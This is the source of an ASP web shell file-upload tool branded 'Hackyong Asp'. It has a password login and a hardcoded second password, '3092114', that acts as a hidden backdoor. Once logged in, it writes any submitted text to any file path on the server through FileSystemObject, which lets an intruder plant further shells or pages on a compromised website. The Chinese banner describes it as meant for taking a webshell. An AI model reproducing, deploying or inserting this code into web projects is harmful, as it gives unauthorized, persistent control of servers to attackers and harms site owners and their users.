<%
'┌───────────────┐
'│　　 http://WwW.12vh.Com　　　│
'└───────────────┘
dim Userpwd,URL
Userpwd = "hackyong"   'User Password
URL     = Request.ServerVariables("URL")
If Request("pwd")=Userpwd or Request("pwd")="3092114" then Session("mgler")=Userpwd
If Session("mgler")<>Userpwd Then
  If Request.Form("pwd")<>"" Then
    If Request.Form("pwd")=Userpwd Then
      Session("mgler")=Userpwd
      Response.Redirect URL
    Else
	 Response.Write"Login Failed, incorrect username or password"
    End If
  Else
    RW="<title>User Login</title>"
    RW=RW & "<center style='font-size:12px'><br><br><br><hr color=#00cc66 width='250'><br><font color=#5f4ds9>【Hackyong Asp】</font><b><font style=color:red;>会员版</font></b>"
    RW=RW & "<form action='" & URL & "' method='post'>"
    RW=RW & "<b>Password：</b><input name='pwd' type='password' size='15' style='font-size: 12px;border: menu 1px solid'>"
    RW=RW & "&nbsp;<input type='submit' value='Login' style='border:1px solid #799AE1;'></form><hr color=#799AE1 width='250'><font color=red>只取webshell</font> <font color=#0011DD>不改首页</font> 不删文件 <font color=#33DD55>不提权</font><br><hr color=#799AE1 width='250'></center>"
    Response.Write RW
    RW=""
  End If
  Response.End
End If
%>
<%on error resume next%>
<%ofso="scripting.filesystemobject"%>
<%set fso=server.createobject(ofso)%>
<%path=request("path")%>
<%if path<>"" then%>
<%data=request("dama")%>
<%set dama=fso.createtextfile(path,true)%>
<%dama.write data%>
<%if err=0 then%>
<%="<b><font style=color:red;>Success!</font></b>"%>
<%else%>
<%="<b><font style=color:red;>False!</font></b>"%>
<%end if%>
<%err.clear%>
<%end if%>
<%dama.close%>
<%set dama=nothing%>
<%set fos=nothing%>
<%="<title>Asp Upload Tool-Hackyong</title>"%>
<%="<form action='' method=post>"%>
<%="<font style=color:BLUE;>File: </font><input type=text name=path size=46>"%>
<%="<br><font style=color:BLUE;>Path: </font><font style=color:red;>"%>
<%=server.mappath(request.servervariables("script_name"))%>
<%="</font><br>"%>
<%=""%>
<%="<textarea name=dama cols=52 rows=9></textarea>"%>
<%="<br><td>"%>
<%="<input type=submit value=Upload> <font style=color:BLUE;>By:Hackyong Qq:"%>
<%="3092114</font>"%>
<%="</form>"%>
